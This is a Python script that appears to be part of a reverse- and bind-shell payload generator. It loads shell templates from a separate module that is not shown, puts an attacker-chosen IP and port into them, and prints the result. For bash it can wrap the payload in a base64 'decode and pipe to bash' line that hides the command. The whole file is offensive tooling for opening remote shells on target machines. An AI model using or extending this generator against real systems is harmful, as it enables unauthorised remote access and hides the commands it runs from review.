#!/bin/env python
import base64
import payloads


def check(ARGS):
    if (ARGS.bind):
        if (ARGS.payload in payloads.payloads_bind):
            generate(ARGS, 'bind') 
            return
        else:
            print(f'[-] {ARGS.payload} not found!. Run `-t all_bind`.')
            return

    if (ARGS.payload in payloads.payloads_reverse):
        generate(ARGS, 'reverse')
    else:
        print(f'[-] {ARGS.payload} not found!. Run `-t all_reverse`.')
        return

def generate(ARGS, TYPE):
    global payload_dict
    global payload_skel
    global payload_raw
   
    payload_skel =payloads.payloads[TYPE][ARGS.payload][ARGS.level]
    payload_raw = payload_skel.replace("127.0.0.1", ARGS.ip).replace("9001", ARGS.port)

    #Encoding check
    if (ARGS.base64):
        if ARGS.payload in payloads.payloads_b64:
            payload_b64 = BASE_64(ARGS.payload)
            print(f'[+] Payload: \n\n{payload_b64}')
            return
        else:
            print(f"[-] Payload {ARGS.payload} not supported in base64 encoding!")
            return

    print(f'[+] Payload: \n\n{payload_raw}')
    return

#Encoding functions
def BASE_64(payload):
    match payload:
        case 'bash':
            payload_data = base64.b64encode(payload_raw.encode())
            payload_b64 = "echo -n " + payload_data.decode() + "|base64 -d|bash" 
    
    return payload_b64
	
	

